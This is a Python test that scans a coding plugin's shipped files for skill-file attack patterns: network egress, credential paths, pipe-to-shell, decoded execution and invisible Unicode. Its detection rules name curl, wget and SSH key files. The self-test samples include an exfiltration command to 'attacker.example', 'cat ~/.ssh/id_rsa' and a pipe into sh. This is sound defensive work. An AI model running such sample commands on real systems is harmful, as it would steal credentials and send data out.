#!/usr/bin/env python3
"""Prove the shipped plugin surface is free of the known SKILL.md attack classes.

Published skills are executable context: a host loads them into an agent that
already holds the user's credentials and file system. Industry scans of public
skill catalogues in 2026 found prompt injection and credential exfiltration in
a large minority of them, so "our skills are clean" has to be a checked claim
rather than a promise in the README.

Scope is everything under plugins/coding-discipline/ that ships to users. The
tests/ directory is excluded on purpose: it names these patterns in order to
search for them.
"""
from __future__ import annotations

import re
import subprocess
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SHIPPED = "plugins/coding-discipline/"

# Each rule is (label, pattern, sample that must match). Patterns target the
# *action*, not the vocabulary: a GitHub URL in a manifest is metadata, while
# `curl https://...` inside a hook is egress. Keeping that distinction is what
# stops this file from degrading into noise everyone learns to ignore.
#
# The sample is not decoration. A scanner whose pattern silently stops matching
# is worse than no scanner, because it reports success forever. Every rule has
# to prove it still fires before it is trusted to prove anything else.
RULES: list[tuple[str, re.Pattern[str], str]] = [
    (
        "network egress from a shipped file",
        re.compile(
            r"(?<![\w-])(curl|wget|scp|sftp|telnet|Invoke-WebRequest|Invoke-RestMethod)"
            r"(?![\w-])",
            re.IGNORECASE,
        ),
        "curl https://attacker.example/collect",
    ),
    (
        "credential or private-key path",
        re.compile(
            r"(?<![\w-])(id_rsa|id_ed25519|id_ecdsa|\.ssh/|\.aws/credentials"
            r"|\.npmrc|\.netrc|_netrc|BEGIN [A-Z ]*PRIVATE KEY)"
        ),
        "cat ~/.ssh/id_rsa",
    ),
    (
        "pipe into a shell",
        re.compile(r"\|\s*(sudo\s+)?(ba|z|k)?sh(?![\w-])"),
        "fetch_payload | sh",
    ),
    (
        "decoded or indirect execution",
        re.compile(r"(?<![\w-])(base64\s+(-d|-D|--decode)|eval\s+[\"']?[$`]\()"),
        "base64 -d payload.b64",
    ),
    (
        # Hidden instructions a human reviewer cannot see in a diff: zero-width
        # marks, bidirectional overrides, and stray byte-order marks. Written as
        # escapes so this rule cannot smuggle in the characters it forbids.
        "invisible or bidirectional Unicode",
        re.compile("[\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff]"),
        chr(0x200B),
    ),
]

for label, pattern, sample in RULES:
    assert pattern.search(sample), f"rule went inert and matches nothing: {label}"


tracked = subprocess.check_output(
    ["git", "ls-files", "--", SHIPPED],
    cwd=ROOT,
    text=True,
).splitlines()
assert tracked, f"no tracked files under {SHIPPED}"

findings: list[str] = []
scanned = 0
for relative in tracked:
    path = ROOT / relative
    if not path.is_file():
        continue
    try:
        text = path.read_text(encoding="utf-8")
    except UnicodeDecodeError:
        findings.append(f"{relative}: not valid UTF-8")
        continue
    scanned += 1
    for label, pattern, _sample in RULES:
        for match in pattern.finditer(text):
            line = text.count("\n", 0, match.start()) + 1
            findings.append(f"{relative}:{line}: {label} -> {match.group(0)!r}")

assert not findings, "shipped plugin surface failed the safety scan:\n" + "\n".join(findings)

# The plugin's only persistence is the local usage log. If that sink ever moves,
# the "nothing is sent over the network" claim in README.md needs re-checking
# rather than inheriting the trust this test grants it today.
usage_lib = (ROOT / SHIPPED / "hooks" / "usage-lib.sh").read_text(encoding="utf-8")
assert 'CD_USAGE_LOG="${CD_USAGE_LOG:-$HOME/.coding-discipline/usage.jsonl}"' in usage_lib, (
    "the local usage sink moved; re-confirm the no-network privacy claim in README.md"
)

print(f"skill safety tests passed ({scanned} shipped files scanned)")
